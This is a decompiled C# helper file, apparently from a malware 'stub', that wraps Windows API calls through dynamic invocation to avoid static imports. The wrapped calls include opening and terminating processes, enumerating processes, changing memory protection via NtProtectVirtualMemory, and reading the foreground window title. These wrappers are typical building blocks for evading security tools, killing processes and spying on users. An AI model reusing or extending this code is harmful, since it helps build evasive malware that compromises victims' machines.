using System;
using System.Text;
using Stub.Helper.CryptString;

namespace Stub.Helper
{
	// Token: 0x0200001C RID: 28
	public static class DllImport
	{
		// Token: 0x06000067 RID: 103 RVA: 0x00003BF8 File Offset: 0x00001DF8
		public static IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId)
		{
			object[] array = new object[]
			{
				dwDesiredAccess,
				bInheritHandle,
				dwProcessId
			};
			return (IntPtr)DInvokeCore.DynamicAPIInvoke("kernel32.dll", "OpenProcess", typeof(Delegates.OpenProcess), ref array);
		}

		// Token: 0x06000068 RID: 104 RVA: 0x00003C54 File Offset: 0x00001E54
		public static IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID)
		{
			object[] array = new object[]
			{
				dwFlags,
				th32ProcessID
			};
			return (IntPtr)DInvokeCore.DynamicAPIInvoke("kernel32.dll", "CreateToolhelp32Snapshot", typeof(Delegates.CreateToolhelp32Snapshot), ref array);
		}

		// Token: 0x06000069 RID: 105 RVA: 0x00003CA4 File Offset: 0x00001EA4
		public static bool CloseHandle(IntPtr handle)
		{
			object[] array = new object[]
			{
				handle
			};
			return (bool)DInvokeCore.DynamicAPIInvoke("kernel32.dll", "CloseHandle", typeof(Delegates.CloseHandle), ref array);
		}

		// Token: 0x0600006A RID: 106 RVA: 0x00003CEC File Offset: 0x00001EEC
		public static bool TerminateProcess(IntPtr dwProcessHandle, int exitCode)
		{
			object[] array = new object[]
			{
				dwProcessHandle,
				exitCode
			};
			return (bool)DInvokeCore.DynamicAPIInvoke("kernel32.dll", "TerminateProcess", typeof(Delegates.TerminateProcess), ref array);
		}

		// Token: 0x0600006B RID: 107 RVA: 0x00003D3C File Offset: 0x00001F3C
		public static int GetModuleHandleA(string lpModuleName)
		{
			object[] array = new object[]
			{
				lpModuleName
			};
			return ((IntPtr)DInvokeCore.DynamicAPIInvoke("kernel32.dll", "GetModuleHandleA", typeof(Delegates.GetModuleHandleA), ref array)).ToInt32();
		}

		// Token: 0x0600006C RID: 108 RVA: 0x00003D88 File Offset: 0x00001F88
		public static bool NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, uint NewProtect, ref uint OldProtect)
		{
			OldProtect = 0U;
			object[] array = new object[]
			{
				ProcessHandle,
				BaseAddress,
				RegionSize,
				NewProtect,
				OldProtect
			};
			if ((uint)DInvokeCore.DynamicAPIInvoke("ntdll.dll", "NtProtectVirtualMemory", typeof(Delegates.NtProtectVirtualMemory), ref array) != 0U)
			{
				return false;
			}
			OldProtect = (uint)array[4];
			return true;
		}

		// Token: 0x0600006D RID: 109 RVA: 0x00003E0C File Offset: 0x0000200C
		public static IntPtr GetForegroundWindow()
		{
			object[] array = new object[0];
			return (IntPtr)DInvokeCore.DynamicAPIInvoke("user32.dll", "GetForegroundWindow", typeof(Delegates.GetForegroundWindow), ref array);
		}

		// Token: 0x0600006E RID: 110 RVA: 0x00003E4C File Offset: 0x0000204C
		public static int GetWindowText(IntPtr hWnd, StringBuilder text, int count)
		{
			object[] array = new object[]
			{
				hWnd,
				text,
				count
			};
			return (int)DInvokeCore.DynamicAPIInvoke("user32.dll", "GetWindowText", typeof(Delegates.GetWindowText), ref array);
		}

		// Token: 0x0600006F RID: 111 RVA: 0x00003EA0 File Offset: 0x000020A0
		public static bool Process32First(IntPtr hSnapshot, ref PROCESSENTRY32 lppe)
		{
			object[] array = new object[]
			{
				hSnapshot,
				lppe
			};
			bool result = (bool)DInvokeCore.DynamicAPIInvoke("kernel32.dll", "Process32First", typeof(Delegates.Process32First), ref array);
			lppe = (PROCESSENTRY32)array[1];
			return result;
		}

		// Token: 0x06000070 RID: 112 RVA: 0x00003F04 File Offset: 0x00002104
		public static bool Process32Next(IntPtr hSnapshot, ref PROCESSENTRY32 lppe)
		{
			object[] array = new object[]
			{
				hSnapshot,
				lppe
			};
			bool result = (bool)DInvokeCore.DynamicAPIInvoke("kernel32.dll", "Process32Next", typeof(Delegates.Process32Next), ref array);
			lppe = (PROCESSENTRY32)array[1];
			return result;
		}
	}
}
